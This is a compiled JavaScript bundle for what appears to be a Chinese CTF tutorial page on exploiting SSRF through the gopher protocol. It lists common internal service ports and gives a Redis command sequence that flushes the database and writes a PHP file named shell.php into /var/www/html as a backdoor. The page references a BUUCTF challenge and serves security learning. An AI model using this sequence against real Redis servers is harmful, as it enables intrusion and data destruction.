(window.webpackJsonp=window.webpackJsonp||[]).push([[47],{806:function(s,a,n){"use strict";n.r(a);var t=n(103),e=Object(t.a)({},(function(){var s=this,a=s.$createElement,n=s._self._c||a;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"gopher-协议"}},[s._v("Gopher 协议 "),n("a",{staticClass:"header-anchor",attrs:{href:"#gopher-协议"}},[s._v("#")])]),s._v(" "),n("p",[s._v("在 http 出现之前，访问网页需要输入的是")]),s._v(" "),n("p",[s._v("gopher://gopher.baidu.com/")]),s._v(" "),n("p",[s._v("而不是")]),s._v(" "),n("p",[s._v("https://www.baidu.com/")]),s._v(" "),n("p",[s._v("而它被代替的原因一方面是收费，另一方面的原因是它固化的结构没有HTML网页灵活")]),s._v(" "),n("p",[s._v("利用 gopher 的方式有 FTP 爆破，REDIS，MYSQL，FAST CGI，XXE")]),s._v(" "),n("h2",{attrs:{id:"一些常用服务"}},[s._v("一些常用服务 "),n("a",{staticClass:"header-anchor",attrs:{href:"#一些常用服务"}},[s._v("#")])]),s._v(" "),n("p",[s._v("Redis\t6379")]),s._v(" "),n("p",[s._v("FPM\t  9000")]),s._v(" "),n("p",[s._v("Smtp\t 25")]),s._v(" "),n("p",[s._v("Mysql\t3306")]),s._v(" "),n("p",[s._v("常用的协议")]),s._v(" "),n("p",[s._v("dict 、gopher")]),s._v(" "),n("p",[s._v("以下为经典的 Redis 未授权访问，以及常用 payload 的生成")]),s._v(" "),n("h2",{attrs:{id:"利用方式"}},[s._v("利用方式 "),n("a",{staticClass:"header-anchor",attrs:{href:"#利用方式"}},[s._v("#")])]),s._v(" "),n("p",[s._v("比如常见的，web 有一个 curl 的功能，然后可以访问内网靶机，就可以用类似的方式进行命令传递")]),s._v(" "),n("p",[s._v("( payload 每经过一次传递就会被解码一次 )")]),s._v(" "),n("p",[s._v("redis")]),s._v(" "),n("p",[n("img",{attrs:{src:"/wgpsec/images/ssrf-gopher/3.png",alt:"3"}})]),s._v(" "),n("p",[s._v("Smtp 生成 payload")]),s._v(" "),n("p",[n("img",{attrs:{src:"/wgpsec/images/ssrf-gopher/1.png",alt:"1"}})]),s._v(" "),n("p",[s._v("Fpm 生成 payload")]),s._v(" "),n("p",[n("img",{attrs:{src:"/wgpsec/images/ssrf-gopher/2.png",alt:"2"}})]),s._v(" "),n("p",[s._v("gopher支持多行。因此要在传输的数据前加一个无用字符。比如 gopher://ip:port/_ 通常用 _ 并不是只能用 _ ，gopher协议会吃掉第一个字符")]),s._v(" "),n("h2",{attrs:{id:"关于-redis"}},[s._v("关于 redis "),n("a",{staticClass:"header-anchor",attrs:{href:"#关于-redis"}},[s._v("#")])]),s._v(" "),n("p",[s._v("redis 的格式：每一个 *number 代表每一行命令，number 代表每行命令中数组中的元素个数。$number 代表每个元素的长度。")]),s._v(" "),n("p",[s._v("URL解码后可以看到创建 shell 的完整流程")]),s._v(" "),n("div",{staticClass:"language-gopher://127.0.0.1:6379/_*1 line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('$8\t\t\t\t\t\t\t//元素长度为8\nflushall\n*3\t\t\t\t\t\t\t//3个元素\n$3\nset\n$1\n1\n$31\n\n<?php echo "hello world" ?>\n\n*4\n$6\nconfig\n$3\nset\n$3\ndir\n$13\n/var/www/html\n*4\n$6\nconfig\n$3\nset\n$10\ndbfilename\n$9\nshell.php\n*1\n$4\nsave\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br")])]),n("p",[s._v("即为redis将输入的语句保存在指定位置的php文件中，生成后门")]),s._v(" "),n("h2",{attrs:{id:"相关环境"}},[s._v("相关环境： "),n("a",{staticClass:"header-anchor",attrs:{href:"#相关环境"}},[s._v("#")])]),s._v(" "),n("p",[s._v("BUUCTF[GKCTF_EZWEB]")])])}),[],!1,null,null,null);a.default=e.exports}}]);